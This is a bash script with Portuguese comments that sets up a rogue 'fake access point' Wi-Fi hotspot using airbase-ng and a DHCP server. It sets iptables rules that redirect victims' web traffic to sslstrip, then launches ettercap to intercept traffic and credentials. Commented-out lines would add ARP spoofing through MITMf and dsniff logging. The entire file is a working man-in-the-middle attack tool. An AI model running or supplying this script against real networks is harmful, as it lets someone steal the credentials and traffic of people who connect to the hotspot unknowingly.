#!/bin/bash

# contributors: cr0d, mel, kd 

INTERNET=0 # interface conectada a rede
INTERNETIP=10.0.0.105 #ip da minha maquina conectada na rede
GATEWAYIP=0 #ip do gateway
HOTSPOT=0 #interface para criar hotspot
CHANNEL=0 #canal para criar hotspot
MONITOR=0 #interface mon
FAP=0 #nome do face access point
#funcao para ativar o ipforward e matar os processos do dhcp airbase e etc
killing(){
    echo 1 > /proc/sys/net/ipv4/ip_forward
    killall -9 isc-dhcp-server dhcp3 airbase-ng xterm tail &>/dev/null
}

#funcao para dar flush nas regras iptables
reset_iptables(){
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
}

#funcao para ler o nome das interfaces que serao usadas para criar o fake rogue xqdl
setup_interfaces(){
echo "[INFO] Your interfaces: "
ifconfig -a | grep -E "(^[a-z])" | sed 's/:.*$//;/^lo.*$/d'
echo ""
echo "[!] Enter the interface connected to the internet: "
read INTERNET

echo "Enter the interface used to create the hotspot: "
echo "[TIP] try:  wlan0, wlp2s0, etc ..."
read HOTSPOT

echo "Enter the interface used to monitor: "
echo "[TIP] try: wlan0mon, wlp2s0mon, etc ..."
read MONITOR

echo "[INFO] Your gateway: "
GATEWAYIP=`route -n | awk '{print $2}' | grep -v 0.0.0.0 | grep -v IP | grep -v Gateway`
echo "$GATEWAYIP"

echo "[!] Enter the name of your Fake Access Point: "
read FAP

echo "Enter the channel for yout hotspot: "
echo "[TIP] try: a number between 1 and 11 "
read CHANNEL

#echo ""

#echo "Enter the MAC for yout hotspot: "
#echo "[TIP] try: 0A:1B:2C:3D:4E:5F"
#read MAC
}

build_ap(){
xterm -hold -e airbase-ng -e "$FAP" -c "$CHANNEL" -P "$MONITOR" &>/dev/null &
}

restart_interfaces(){
airmon-ng stop "$MONITOR"
airmon-ng stop "$HOTSPOT"
ifconfig "$HOTSPOT" down
airmon-ng start "$HOTSPOT"
sleep 2
ifconfig "$MONITOR" down
#macchanger -n "$MAC" "$MONITOR"
sleep 1
modprobe tun
sleep 1
}

config_at0(){
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
}

setup_iptables(){
iptables -t nat -A PREROUTING -p udp -j DNAT --to 10.0.0.1
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUNTING --out-interface $INTERNET -j MASQUERADE #wlp2s0 eh a inter conectada a rede
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
}

setup_dhcp(){
sed 's/^//' <<CHAR_EOF > /etc/dhcp/dhcpd.conf
authoritative;
default-lease-time 600;
max-lease-time 7200;
#INTERFACES="at0";

subnet 192.168.1.0 netmask 255.255.255.0 {
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name "$FAP";
option domain-name-servers 8.8.8.8, 8.8.4.4;
range 192.168.1.2 192.168.1.25;
}
CHAR_EOF

}

start_dhcp(){
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
#/etc/init.d/isc-dhcp-server start >/dev/null
service isc-dhcp-server start >/dev/null
}
reset_network(){
    airmon-ng stop $MONITOR 1> /dev/null
    service network-manager start 1>/dev/null
}

#main
if [ "$EUID" -ne 0 ]
then 
    echo "[WARNING] Script need to be run by root."
    echo "[TIP] try: sudo bash $0"
    exit
fi

for CMD in route xterm airmon-ng pkill dhcpd python aircrack-ng ettercap sslstrip

do
    if [ ! `which $CMD` ]
    then
        echo "[ERROR] Missing command/app \"$CMD\". Install it first."
		echo "[TIP] try: sudo apt install $CMD -y"
        exit
    fi
done

echo -n "[INFO] Activating IP Forwarding and killing old fake AP processes if they exist... "
killing 
echo "Done"

echo -n "[INFO] Flushing iptables rules... "
reset_iptables
echo "Done"

setup_interfaces

echo -n "[INFO] Restarting $HOTSPOT on $MONITOR ... "
restart_interfaces
echo "Done"


echo -n "[INFO] building "$FAP"... "
build_ap
sleep 3
    
echo -n "[INFO] Configuring the at0... "
config_at0
echo "Done"

echo -n "[INFO] setuping dchp... "
setup_dhcp
echo "Done"

echo -n "[INFO] Setting up iptables rules... "
setup_iptables
echo "Done"

echo -n "[INFO] Starting dhcp... "
start_dhcp
echo "Done"

xterm -hold -e sslstrip -f -p -k 10000 &
sleep 3
xterm -hold -e ettercap -p -u -T -q -i at0
#echo "Setting up mitmf"
#xterm -hold -e python MITMf/mitmf.py -i enp1s0 --spoof --arp --gateway $GATEWAYIP --responder --wpad &
#xterm -e dsniff -m -i at0 -d -s 4096 -w dsniff$(date +%F-%H%M).log &> /dev/null &

echo -n "[INFO] Rebuilding your wifi conection..."
reset_network
echo "Done"

echo ""
echo "Cya"
